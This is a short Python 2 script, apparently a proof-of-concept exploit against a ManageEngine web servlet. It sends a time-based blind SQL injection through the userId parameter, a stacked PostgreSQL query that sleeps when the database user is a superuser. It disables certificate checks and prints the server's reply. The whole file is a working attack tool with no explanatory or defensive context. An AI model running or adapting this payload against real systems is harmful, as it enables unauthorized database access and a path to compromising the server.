#!/usr/bin/env python2
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print "[+] Usage %s <target>" % sys.argv[0]
        print "[+] e.g.: %s manageengine" % sys.argv[0]
        sys.exit(1)

    t = sys.argv[1]

    sqli = ";"
    sqli = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"

    r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, params='ForMasRange=1&userId=1%s' % sqli, verify=False)
    print r.text
    print r.headers

if __name__ == '__main__':
    main()
